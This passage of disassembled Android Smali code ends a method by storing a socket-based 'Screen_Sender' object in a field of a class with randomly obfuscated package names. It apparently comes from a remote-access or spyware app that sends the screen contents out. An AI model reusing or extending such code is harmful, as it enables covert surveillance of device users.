    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iput-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;

    :cond_6
    return-void
.end method
